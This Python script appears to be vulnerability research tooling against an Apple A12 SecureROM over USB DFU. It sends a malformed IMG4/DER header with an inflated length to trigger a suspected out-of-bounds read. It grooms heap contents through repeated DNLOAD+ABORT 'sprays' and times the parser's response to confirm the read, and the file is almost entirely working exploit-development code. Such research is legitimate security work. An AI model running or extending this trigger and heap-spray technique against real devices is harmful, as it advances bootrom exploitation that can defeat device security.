#!/usr/bin/env python3
"""
A12 SecureROM — OOB Read Confirmation Test
============================================
HYPOTHESIS: DER parser reads OOB past 2048B buffer into heap.
Heap content (controlled via DNLOAD+ABORT) affects timing.

THIS TEST PROVES IT by using identical DNLOAD+ABORT operations
but varying ONLY the byte content of the primer.

If timing varies with content → OOB read CONFIRMED.
If timing is constant → DNLOAD+ABORT just changes state (no OOB read).

We use single-byte patterns for maximum clarity:
  0x00, 0x30, 0xFF (one each, same size, same operation count)
"""
import time, json, statistics
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class OOBConfirm:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def ctrl(self, rt, req, val, idx, d, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, d, timeout=timeout)

    def status(self):
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def to_idle(self):
        for _ in range(20):
            s = self.status()
            if not s: time.sleep(0.1); self.connect(); continue
            if s[0] == 2: return True
            if s[0] == 10: self.ctrl(0x21, 4, 0, 0, 0)
            elif s[0] == 4: time.sleep(s[2]/1000+0.01); self.status()
            try: self.ctrl(0x21, 6, 0, 0, 0)
            except: pass
            time.sleep(0.02)
        return False

    def dnload_abort(self, payload):
        if not self.to_idle(): return False
        try: self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
        except: return False
        self.status()  # transition to DNLOAD-IDLE
        try: self.ctrl(0x21, 6, 0, 0, 0)  # ABORT
        except: pass
        time.sleep(0.01)
        return True

    def manifest_time(self, payload):
        """Full manifest cycle, returns time in us"""
        if not self.to_idle(): return None
        t0 = time.perf_counter_ns()
        try: self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
        except: return None
        s = self.status()
        if not s or s[0] != 5: return None
        try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
        except: pass
        s = self.status()  # enter manifest
        for _ in range(100):
            if not s or s[0] in (2, 8, 10): break
            if s[0] == 4: time.sleep(s[2]/1000)
            s = self.status()
        return (time.perf_counter_ns() - t0) / 1000

    def run(self):
        log("="*60)
        log("A12 — OOB Read Confirmation (Content-Dependent Timing)")
        log("="*60)

        if not self.connect():
            log("NO DFU DEVICE"); return

        results = {"timestamp": datetime.now().isoformat()}

        # OOB trigger: IMG4 with claimed length 4090 (2052 bytes OOB)
        trigger = b"\x30\x82\x0F\xFA\x16\x04IMG4" + bytes(2048 - 10)

        REPS = 10  # More reps for statistical significance

        # ============================================
        # Test 1: A-B-A-B interleaved comparison
        # Alternate between two primers and measure
        # This eliminates temporal drift
        # ============================================
        log("\n=== Test 1: Interleaved A/B comparison ===")
        log("  Primer A: 0xFF (should cause fast rejection)")
        log("  Primer B: 0x30 (SEQUENCE tag, should cause deep parsing)")
        
        primer_a = b"\xFF" * 2048
        primer_b = b"\x30" * 2048
        
        times_a = []
        times_b = []
        
        for i in range(REPS):
            # Prime with A, measure
            self.dnload_abort(primer_a)
            ta = self.manifest_time(trigger)
            if ta: times_a.append(ta)
            
            # Prime with B, measure
            self.dnload_abort(primer_b)
            tb = self.manifest_time(trigger)
            if tb: times_b.append(tb)
            
            if ta and tb:
                log(f"  round {i:2d}: A(0xFF)={ta:>8.0f}us  B(0x30)={tb:>8.0f}us  "
                    f"diff={tb-ta:+.0f}us")
        
        med_a = statistics.median(times_a) if times_a else 0
        med_b = statistics.median(times_b) if times_b else 0
        
        log(f"  --- SUMMARY ---")
        log(f"  A (0xFF): median={med_a:.0f}us stdev={statistics.stdev(times_a):.0f}" if len(times_a)>1 else "  A: insufficient")
        log(f"  B (0x30): median={med_b:.0f}us stdev={statistics.stdev(times_b):.0f}" if len(times_b)>1 else "  B: insufficient")
        log(f"  Diff (B-A): {med_b - med_a:+.0f}us")
        
        results["interleaved_ab"] = {
            "primer_a": "0xFF",
            "primer_b": "0x30",
            "a_median": round(med_a),
            "b_median": round(med_b),
            "diff": round(med_b - med_a),
            "a_raw": [round(t) for t in times_a],
            "b_raw": [round(t) for t in times_b],
        }

        # ============================================
        # Test 2: 4-way comparison (0x00, 0x30, 0x41, 0xFF)
        # ============================================
        log("\n=== Test 2: 4-way byte pattern comparison ===")
        
        patterns = {
            "0x00": bytes(2048),
            "0x30": b"\x30" * 2048,
            "0x41": b"\x41" * 2048,
            "0xFF": b"\xFF" * 2048,
        }
        
        pattern_times = {k: [] for k in patterns}
        
        for i in range(REPS):
            for name, primer in patterns.items():
                self.dnload_abort(primer)
                t = self.manifest_time(trigger)
                if t:
                    pattern_times[name].append(t)
            
            vals = {k: pattern_times[k][-1] if pattern_times[k] else 0 for k in patterns}
            log(f"  round {i:2d}: " + " | ".join(f"{k}={v:>7.0f}" for k,v in vals.items()))
        
        log(f"  --- MEDIANS ---")
        for name, times in pattern_times.items():
            if times:
                med = statistics.median(times)
                std = statistics.stdev(times) if len(times) > 1 else 0
                log(f"  {name}: median={med:>8.0f}us stdev={std:.0f}us")
        
        results["four_way"] = {k: {"median": round(statistics.median(v)) if v else 0,
                                    "stdev": round(statistics.stdev(v)) if len(v)>1 else 0,
                                    "raw": [round(t) for t in v]}
                                for k, v in pattern_times.items()}

        # ============================================
        # Test 3: No priming vs priming (sanity check)
        # ============================================
        log("\n=== Test 3: With vs without DNLOAD+ABORT ===")
        
        no_prime = []
        with_prime_ff = []
        with_prime_30 = []
        
        for i in range(REPS):
            # No priming
            t = self.manifest_time(trigger)
            if t: no_prime.append(t)
            
            # Prime with 0xFF
            self.dnload_abort(b"\xFF" * 2048)
            t = self.manifest_time(trigger)
            if t: with_prime_ff.append(t)
            
            # Prime with 0x30
            self.dnload_abort(b"\x30" * 2048)
            t = self.manifest_time(trigger)
            if t: with_prime_30.append(t)
        
        for name, times in [("no_prime", no_prime), 
                            ("prime_0xFF", with_prime_ff),
                            ("prime_0x30", with_prime_30)]:
            if times:
                log(f"  {name:15s}: median={statistics.median(times):>8.0f}us "
                    f"stdev={statistics.stdev(times) if len(times)>1 else 0:.0f}")
        
        results["prime_vs_no_prime"] = {
            "no_prime": [round(t) for t in no_prime],
            "prime_0xFF": [round(t) for t in with_prime_ff],
            "prime_0x30": [round(t) for t in with_prime_30],
        }

        # ============================================
        # Test 4: Multiple DNLOAD+ABORT to amplify effect
        # ============================================
        log("\n=== Test 4: Multi-spray (5x DNLOAD+ABORT) ===")
        
        multi_tests = {}
        for name, fill_byte in [("0xFF", 0xFF), ("0x30", 0x30), ("0x00", 0x00)]:
            primer = bytes([fill_byte]) * 2048
            times = []
            for i in range(REPS):
                # Spray 5 times
                for _ in range(5):
                    self.dnload_abort(primer)
                
                t = self.manifest_time(trigger)
                if t: times.append(t)
            
            med = statistics.median(times) if times else 0
            multi_tests[name] = {"median": round(med), "raw": [round(t) for t in times]}
            log(f"  {name} (5x spray): median={med:>8.0f}us")
        
        results["multi_spray"] = multi_tests

        # Save
        outf = Path(__file__).parent / "results" / "oob_confirm.json"
        outf.parent.mkdir(exist_ok=True)
        with open(outf, "w") as f:
            json.dump(results, f, indent=2)
        log(f"\nSaved: {outf}")
        log("DONE")

if __name__ == "__main__":
    OOBConfirm().run()
